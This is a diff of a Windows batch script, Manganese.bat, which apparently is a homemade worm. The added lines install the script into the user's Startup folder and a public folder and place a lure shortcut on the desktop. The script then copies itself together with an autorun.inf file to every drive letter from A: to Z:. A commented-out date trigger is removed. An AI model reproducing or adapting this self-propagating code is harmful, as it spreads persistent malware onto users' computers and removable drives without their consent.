@@ -2,23 +2,19 @@
 
 COLOR A
 
+IF /I %1==confirm (
+goto :INSTALL
+)ELSE (
+goto :END
+
+
+)
+:INSTALL
+
+REM Installs itself on the users computer and connected drives
 copy Manganese.bat "D:\%username%\Start Menu\Programs\Startup"
 copy Manganese.bat C:\Users\Public
-copy "Don't Open.lnk" "D:\%username%\Desktop"
-
-
-REM :CHECKMONTH
-REM if %date:~4,2% GEQ 04 goto :CHECKDAY
-REM goto :checkmonth
-
-REM :CHECKDAY
-REM if %date:~7,2% GEQ 01 goto :CHECKYEAR
-REM goto :checkmonth
-
-REM :CHECKYEAR
-REM if %date:~10,4% GEQ 2016 goto :START
-REM goto :checkmonth
-
+copy "Don't Open (2).lnk" "D:\%username%\Desktop"
 copy Manganese.bat A:\
 copy autorun.inf A:\
 copy Manganese.bat B:\
@@ -71,6 +67,8 @@ copy Manganese.bat Y:\
 copy autorun.inf Y:\
 copy Manganese.bat Z:\
 copy autorun.inf Z:\
+
+REM Stops everything simply by plugging in a flash drive
 
 if exist Penis.txt "D:\%username%\desktop" goto :END
 
